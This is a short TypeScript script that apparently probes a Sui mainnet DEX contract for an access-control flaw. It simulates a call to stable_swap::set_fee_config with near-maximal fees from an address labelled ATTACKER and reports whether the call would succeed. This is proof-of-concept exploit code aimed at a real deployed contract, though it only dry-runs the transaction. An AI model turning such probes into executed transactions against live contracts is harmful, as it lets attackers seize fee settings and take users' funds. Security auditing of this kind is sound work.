import { SuiClient } from "@mysten/sui/client";
import { Transaction } from "@mysten/sui/transactions";

const client = new SuiClient({ url: "https://fullnode.mainnet.sui.io:443" });
const PKG = "0xb24b6789e088b876afabca733bed2299fbc9e2d6369be4d1acfa17d8145454d9";
const DEX_STABLE_INFO = "0x5a7eca40df453efe6bb1feae99e5b8fc072d1252cbd1979eb187d625dc9b47c9";
const ATTACKER = "0xdeadbeef00000000000000000000000000000000000000000000000000000000";

async function main() {
  // set_fee_config: (u64, u64, &mut Dex_Stable_Info) - correct order
  const tx = new Transaction();
  tx.moveCall({
    target: `${PKG}::stable_swap::set_fee_config`,
    arguments: [
      tx.pure.u64(9999),
      tx.pure.u64(9999),
      tx.object(DEX_STABLE_INFO),
    ],
  });
  const result = await client.devInspectTransactionBlock({
    transactionBlock: tx,
    sender: ATTACKER,
  });
  const status = result.effects.status;
  console.log("stable_swap::set_fee_config status:", status.status);
  if (status.status === "success") {
    console.log("!!! CRITICAL SUCCESS !!!");
  } else {
    console.log("Error:", status.error);
  }
}
main();
